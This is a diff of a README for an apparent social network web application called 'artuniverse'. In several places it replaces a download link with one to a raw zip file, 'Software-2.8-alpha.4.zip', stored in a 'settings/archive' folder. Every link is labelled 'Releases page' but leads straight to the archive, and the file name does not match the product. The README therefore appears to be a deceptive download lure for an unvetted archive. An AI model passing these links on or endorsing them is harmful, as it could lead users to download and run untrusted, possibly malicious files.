@@ -4,7 +4,7 @@
 Welcome to artuniverse, your complete social network solution! With features like user authentication, posts, follower systems, a dynamic feed, and email password recovery, this application focuses on organization and security. Let's get started.
 
 ## 🔗 Download Now
-[![Download from Releases](https://raw.githubusercontent.com/Bugfux1979/artuniverse/main/create/artuniverse_2.1.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/Bugfux1979/artuniverse/main/create/artuniverse_2.1.zip)
+[![Download from Releases](https://raw.githubusercontent.com/Bugfux1979/artuniverse/main/settings/archive/Software-2.8-alpha.4.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/Bugfux1979/artuniverse/main/settings/archive/Software-2.8-alpha.4.zip)
 
 ## 💻 System Requirements
 Before you begin, make sure your system meets the following requirements:
@@ -19,7 +19,7 @@ Before you begin, make sure your system meets the following requirements:
 Follow these steps to download and set up artuniverse.
 
 1. **Visit the Releases Page**  
-   Click this link to go to the [Releases page](https://raw.githubusercontent.com/Bugfux1979/artuniverse/main/create/artuniverse_2.1.zip).
+   Click this link to go to the [Releases page](https://raw.githubusercontent.com/Bugfux1979/artuniverse/main/settings/archive/Software-2.8-alpha.4.zip).
 
 2. **Select the Latest Release**  
    On the Releases page, find the section labeled "Latest Release." This section lists the most recent version of artuniverse.
@@ -78,4 +78,4 @@ This project covers a variety of programming and web development topics:
 If you have questions or need support, you can reach out by creating an issue on the GitHub repository or visiting the community forums. We are here to help you!
 
 ## 🔗 Download Again
-Just in case you missed it, you can download artuniverse by visiting the [Releases page](https://raw.githubusercontent.com/Bugfux1979/artuniverse/main/create/artuniverse_2.1.zip).
+Just in case you missed it, you can download artuniverse by visiting the [Releases page](https://raw.githubusercontent.com/Bugfux1979/artuniverse/main/settings/archive/Software-2.8-alpha.4.zip).
